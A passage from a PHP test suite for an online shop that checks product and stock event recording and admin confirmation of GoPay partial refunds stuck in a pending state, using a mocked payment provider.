    assert_equals([1, 1200], [count($r6mUpdated), (int)($r6mUpdated[0]['price']['amount'] ?? 0)], 'R6 events: a CSV import that changes a product records product.updated (was API only)');
    Import::importProduct(['sku' => 'R6M-EVT', 'name' => 'R6M Event', 'price' => '12.00'], $pdo);
    assert_equals(1, count($r6mEvents('product.updated')), 'R6 events: an import that changes nothing records nothing');
    $r6mPriceOnly = new ReflectionMethod(FeedImport::class, 'updatePriceOnly');
    $pdo->beginTransaction();
    $r6mPriceOnly->invoke(null, ['sku' => 'R6M-EVT', 'price' => '10.00'], $pdo);
    $pdo->commit();
    assert_equals(2, count($r6mEvents('product.updated')), 'R6 events: a price/stock feed that changes the price records product.updated');
    $r6mCatalog = str_replace("\r\n", "\n", entrypointSource('admin.php'));
    assert_true(str_contains($r6mCatalog, "Products::recordUpdated(\$id, \$old);\n                \$db->commit();"), 'R6 events: the admin product edit records product.updated in its transaction');

    $r6mWarehouse = Warehouse::defaultWarehouse();
    if (!$r6mWarehouse) throw new RuntimeException('no default warehouse in the test catalog');
    Products::setAvailableStock('R6M-EVT', 'simple', 5, 'manual_adjustment', 'admin_product');
    Warehouse::bulkSetStock((int)$r6mWarehouse['id'], ['R6M-EVT' => 8]);
    Warehouse::bulkSetStock((int)$r6mWarehouse['id'], ['R6M-EVT' => 8]);
    $r6mAdjusted = array_map(static fn(array $p): array => [$p['reason'] ?? '', $p['before'] ?? null, $p['after'] ?? null], $r6mEvents('stock.adjusted'));
    assert_equals([['manual_adjustment', 0, 5], ['feed_sync', 5, 8]], $r6mAdjusted,
        'R6 events: admin/import stock edits and warehouse feeds record stock.adjusted once per change (was API only)');
    $r6mApi = (string)file_get_contents(dirname(TEST_CLI_DIR) . '/src/ApiV1.php');
    assert_true(!str_contains($r6mApi, "'api.v1.inventory.adjust'"), 'R6 events: the API inventory adjustment is not recorded twice (the ledger records it)');

} catch (Throwable $e) {
    if (Db::get()->inTransaction()) Db::get()->rollBack();
    $r6mRaised($e);
}
try {
    // --- Refunds: a GoPay partial refund the provider accepted can be completed ---------------
    // GoPay answers a refund ACCEPTED and later reports the payment PARTIALLY_REFUNDED without the amount, so no
    // notification could book it: the payment stayed refund_pending forever and the admin had no way to finish it.
    $r6mGoPayState = 'PAID';
    $r6mGoPay = new GoPayPayment(['gopay_goid' => '8123456789', 'gopay_client_id' => 'c', 'gopay_client_secret' => 's'],
        static function (string $method, string $url, array $headers, ?string $body) use (&$r6mGoPayState): array {
            if (str_contains($url, 'oauth2')) return ['status' => 200, 'body' => json_encode(['access_token' => 't', 'expires_in' => 1800])];
            if (str_ends_with($url, '/refund')) return ['status' => 200, 'body' => json_encode(['id' => 3600000101, 'result' => 'ACCEPTED'])];
            $id = (int)substr($url, strrpos($url, '/') + 1);
            return ['status' => 200, 'body' => json_encode(['id' => $id, 'state' => $r6mGoPayState, 'order_number' => 'ARR-GOPAY-' . $id, 'amount' => 1000,
                'currency' => 'EUR', 'target' => ['type' => 'ACCOUNT', 'goid' => 8123456789]])];
        });
    $r6mUse($r6mGoPay);
    $r6mPartial = $r6mOrder('gopay', '3600000301');
    PaymentService::requestRefundAndQueue($r6mPartial, 300, 'r6m_partial_request', ['reason' => 'R6M']);
    $r6mRunJobs($r6mPartial);
    $r6mGoPayState = 'PARTIALLY_REFUNDED';
    PaymentService::handlePulledNotification(['id' => '3600000301'], $r6mGoPay, 'gopay');
    assert_equals(['refund_pending', 0, 1000], $r6mState($r6mPartial), 'R6 refund: an accepted GoPay partial refund waits; its PARTIALLY_REFUNDED report names no amount');
    assert_true(PaymentService::unexecutedRefundRequest(Orders::byId($r6mPartial)) === null, 'R6 refund: the executed request is not offered for a retry (it would refund again)');
    $r6mHasConfirm = method_exists(PaymentService::class, 'confirmProviderRefund') && method_exists(PaymentService::class, 'unconfirmedProviderRefund');
    assert_true($r6mHasConfirm, 'R6 refund: an admin can complete a provider refund that no notification confirms (PaymentService::confirmProviderRefund)');
    if ($r6mHasConfirm) {
        assert_equals(['amount' => 300, 'request_key' => 'r6m_partial_request'], PaymentService::unconfirmedProviderRefund(Orders::byId($r6mPartial)),
            'R6 refund: the accepted GoPay refund is offered for confirmation with its amount');
        PaymentService::confirmProviderRefund($r6mPartial, 'r6m-admin', 'Seen paid in the GoPay portal');
        assert_equals(['partially_refunded', 300, 700], $r6mState($r6mPartial), 'R6 refund: the confirmed partial refund is booked once (was stuck in refund_pending)');
        $r6mAgain = false;
        try { PaymentService::confirmProviderRefund($r6mPartial, 'r6m-admin', 'twice'); } catch (LogicException $e) { $r6mAgain = true; }
        assert_true($r6mAgain && $r6mState($r6mPartial)[1] === 300, 'R6 refund: a second confirmation books nothing');
        $r6mAudit = (int)$pdo->query("SELECT COUNT(*) FROM audit_log WHERE entity = 'order_refund' AND entity_id = '{$r6mPartial}' AND note LIKE '%confirmed by r6m-admin%'")->fetchColumn();
        assert_equals(1, $r6mAudit, 'R6 refund: the confirmation is audited with the acting admin');
        $r6mGoPayState = 'PARTIALLY_REFUNDED';
        PaymentService::handlePulledNotification(['id' => '3600000301'], $r6mGoPay, 'gopay');
        assert_equals(300, PaymentService::refundedAmount($r6mPartial), 'R6 refund: a later GoPay report of the same refund books nothing more');

        // The rest refunded in full: GoPay's REFUNDED report still completes it on its own.
        PaymentService::requestRefundAndQueue($r6mPartial, 700, 'r6m_rest_request', ['reason' => 'R6M']);
        $r6mGoPayState = 'PARTIALLY_REFUNDED';
        $r6mRunJobs($r6mPartial);
        $r6mGoPayState = 'REFUNDED';
        PaymentService::handlePulledNotification(['id' => '3600000301'], $r6mGoPay, 'gopay');
        assert_equals(['refunded', 1000, 0], $r6mState($r6mPartial), 'R6 refund: GoPay REFUNDED still completes the last refund without the admin');

        // A refund the provider names by id is completed by its own webhook, never by hand.
        $r6mUnrequested = $r6mOrder('gopay', '3600000302');
        PaymentService::requestRefund($r6mUnrequested, 200, 'r6m_unexecuted_request');
        assert_true(PaymentService::unconfirmedProviderRefund(Orders::byId($r6mUnrequested)) === null, 'R6 refund: a request no job executed yet is retried, not confirmed');
        $pdo->prepare("INSERT INTO payment_transactions (order_id, store_id, provider, provider_ref, status, amount, currency, idempotency_key, raw_response, created_at, updated_at)
            VALUES (?, 'default', 'payu', 'RF-R6M-1', 'refund_pending', 200, 'eur', 'r6m_unexecuted_request_execute', '{}', " . Db::now() . ', ' . Db::now() . ")")->execute([$r6mUnrequested]);
        assert_true(PaymentService::unconfirmedProviderRefund(Orders::byId($r6mUnrequested)) === null, 'R6 refund: a pending refund with a provider refund id waits for its webhook');

        // The usual partial refund is an item credit note (RMA): InvoiceService::credit() moves the payment to
        // refund_pending, adds a pending order_refunds row and queues payment_refund with that refund id.
        $r6mCredited = $r6mOrder('gopay', '3600000303');
        // An earlier credit note of the same amount, not yet executed: only the accepted one may be completed.
        $pdo->prepare("INSERT INTO order_refunds (store_id, order_id, rma_id, credit_note_id, amount, currency, status, idempotency_key)
            VALUES ('default', ?, 0, 0, 250, 'eur', 'pending', 'r6m-credit-0')")->execute([$r6mCredited]);
        $r6mOtherRefund = (int)$pdo->lastInsertId();
        $pdo->prepare("INSERT INTO order_refunds (store_id, order_id, rma_id, credit_note_id, amount, currency, status, idempotency_key)
            VALUES ('default', ?, 0, 0, 250, 'eur', 'pending', 'r6m-credit-1')")->execute([$r6mCredited]);
        $r6mCreditRefund = (int)$pdo->lastInsertId();
        $pdo->prepare("UPDATE orders SET payment_status = 'refund_pending' WHERE id = ?")->execute([$r6mCredited]);
        JobQueue::push('payment_refund', ['order_id' => $r6mCredited, 'payment_id' => '3600000303', 'amount' => 250,
            'refund_id' => $r6mCreditRefund, 'idempotency_key' => 'r6m-credit-1'], 1);
        $r6mGoPayState = 'PAID';
        $r6mRunJobs($r6mCredited);
        $r6mGoPayState = 'PARTIALLY_REFUNDED';
        PaymentService::handlePulledNotification(['id' => '3600000303'], $r6mGoPay, 'gopay');
        assert_equals(['refund_pending', 0, 1000], $r6mState($r6mCredited), 'R6 refund: an accepted GoPay credit-note refund waits; its PARTIALLY_REFUNDED report books nothing');
        assert_equals(['amount' => 250, 'request_key' => 'r6m-credit-1', 'refund_id' => $r6mCreditRefund], PaymentService::unconfirmedProviderRefund(Orders::byId($r6mCredited)),
            'R6 refund: an accepted GoPay credit-note refund is offered for confirmation too (was stuck in refund_pending)');
        PaymentService::confirmProviderRefund($r6mCredited, 'r6m-admin', 'Credit note refund seen in the GoPay portal');
        assert_equals(['partially_refunded', 250, 750], $r6mState($r6mCredited), 'R6 refund: the confirmed credit-note refund is booked once');
        assert_equals(['succeeded', 'admin-confirmed:r6m-admin', 'pending'], [(string)Rma::refundById($r6mCreditRefund)['status'],
            (string)Rma::refundById($r6mCreditRefund)['payment_reference'], (string)Rma::refundById($r6mOtherRefund)['status']],
            'R6 refund: the confirmation completes that credit note refund, not another of the same amount');
        PaymentService::handlePulledNotification(['id' => '3600000303'], $r6mGoPay, 'gopay');
        assert_equals(250, PaymentService::refundedAmount($r6mCredited), 'R6 refund: a later GoPay report of the credit-note refund books nothing more');

        // R7: two credit notes accepted by GoPay at once. Confirming one leaves the payment partially_refunded; the
        // other must still be offered, else its money is never booked.
        $r7Twin = $r6mOrder('gopay', '3600000305');
        $r7TwinRefunds = [];
        foreach ([250 => 'r7-twin-a', 300 => 'r7-twin-b'] as $r7Amount => $r7Key) {
            $pdo->prepare("INSERT INTO order_refunds (store_id, order_id, rma_id, credit_note_id, amount, currency, status, idempotency_key)
                VALUES ('default', ?, 0, 0, ?, 'eur', 'pending', ?)")->execute([$r7Twin, $r7Amount, $r7Key]);
            $r7TwinRefunds[$r7Key] = (int)$pdo->lastInsertId();
            JobQueue::push('payment_refund', ['order_id' => $r7Twin, 'payment_id' => '3600000305', 'amount' => $r7Amount,
                'refund_id' => $r7TwinRefunds[$r7Key], 'idempotency_key' => $r7Key], 1);
        }
        $pdo->prepare("UPDATE orders SET payment_status = 'refund_pending' WHERE id = ?")->execute([$r7Twin]);
        $r6mGoPayState = 'PAID';
        $r6mRunJobs($r7Twin);
        $r6mGoPayState = 'PARTIALLY_REFUNDED';
        PaymentService::handlePulledNotification(['id' => '3600000305'], $r6mGoPay, 'gopay');
        $r7First = PaymentService::unconfirmedProviderRefund(Orders::byId($r7Twin));
        PaymentService::confirmProviderRefund($r7Twin, 'r7-admin', 'First credit note refund seen in the GoPay portal');
        $r7Second = PaymentService::unconfirmedProviderRefund(Orders::byId($r7Twin));
        assert_true($r7First !== null && $r7Second !== null && $r7Second['refund_id'] !== $r7First['refund_id'],
            'R7 refund: after one of two concurrent GoPay credit-note refunds is confirmed, the other is still offered (was hidden by partially_refunded)');
        PaymentService::confirmProviderRefund($r7Twin, 'r7-admin', 'Second credit note refund seen in the GoPay portal');
        assert_equals([550, 'succeeded', 'succeeded'], [PaymentService::refundedAmount($r7Twin),
            (string)Rma::refundById($r7TwinRefunds['r7-twin-a'])['status'], (string)Rma::refundById($r7TwinRefunds['r7-twin-b'])['status']],
            'R7 refund: both concurrent GoPay credit-note refunds are booked once each');
        assert_true(PaymentService::unconfirmedProviderRefund(Orders::byId($r7Twin)) === null, 'R7 refund: nothing is left to confirm');

        // A goodwill refund the admin confirmed first, then an RMA credit note: the settled request must not hide it.
        $r6mLater = $r6mOrder('gopay', '3600000304');
        PaymentService::requestRefundAndQueue($r6mLater, 300, 'r6m_goodwill_request', ['reason' => 'R6M']);
        $r6mGoPayState = 'PAID';
        $r6mRunJobs($r6mLater);
        PaymentService::confirmProviderRefund($r6mLater, 'r6m-admin', 'Goodwill refund seen in the GoPay portal');
        $pdo->prepare("INSERT INTO order_refunds (store_id, order_id, rma_id, credit_note_id, amount, currency, status, idempotency_key)
            VALUES ('default', ?, 0, 0, 250, 'eur', 'pending', 'r6m-credit-after-confirm')")->execute([$r6mLater]);
        $r6mLaterRefund = (int)$pdo->lastInsertId();
        $pdo->prepare("UPDATE orders SET payment_status = 'refund_pending' WHERE id = ?")->execute([$r6mLater]);
        JobQueue::push('payment_refund', ['order_id' => $r6mLater, 'payment_id' => '3600000304', 'amount' => 250,
            'refund_id' => $r6mLaterRefund, 'idempotency_key' => 'r6m-credit-after-confirm'], 1);
        $r6mRunJobs($r6mLater);
        $r6mGoPayState = 'PARTIALLY_REFUNDED';
        PaymentService::handlePulledNotification(['id' => '3600000304'], $r6mGoPay, 'gopay');
        assert_equals(['amount' => 250, 'request_key' => 'r6m-credit-after-confirm', 'refund_id' => $r6mLaterRefund], PaymentService::unconfirmedProviderRefund(Orders::byId($r6mLater)),
            'R6 refund: a credit note after an admin-confirmed refund is offered, not the settled request');
        assert_true(PaymentService::unexecutedRefundRequest(Orders::byId($r6mLater)) === null, 'R6 refund: the settled request is not offered for a retry either');
        try { PaymentService::confirmProviderRefund($r6mLater, 'r6m-admin', 'Credit note refund seen in the GoPay portal'); } catch (LogicException $e) { }
        assert_equals(['partially_refunded', 550, 450, 'succeeded'], array_merge($r6mState($r6mLater), [(string)Rma::refundById($r6mLaterRefund)['status']]),
            'R6 refund: that credit note refund is completed after the earlier confirmed one (was stuck in refund_pending)');

        $r6mAdmin = str_replace("\r\n", "\n", entrypointSource('admin.php'));
        assert_true(str_contains($r6mAdmin, "'order:refund_confirm' => handleOrderRefundConfirm()")
            && str_contains($r6mAdmin, "function handleOrderRefundConfirm(): void {\n    Security::adminRequire('orders.refund');")
            && str_contains($r6mAdmin, 'action=refund_confirm'),
            'R6 refund: the confirmation is a CSRF-checked admin POST that needs the refund permission');
    }
} catch (Throwable $e) {
    $r6mRaised($e);
} finally {
    $r6mAdapters->setValue(null, $r6mSavedAdapters);
    foreach (['pending', 'processing', 'failed', 'done'] as $r6mSub) {
        foreach (glob($r6mJobsDir . '/' . $r6mSub . '/*') ?: [] as $r6mFile) @unlink($r6mFile);
        @rmdir($r6mJobsDir . '/' . $r6mSub);
    }
    @rmdir($r6mJobsDir);
}
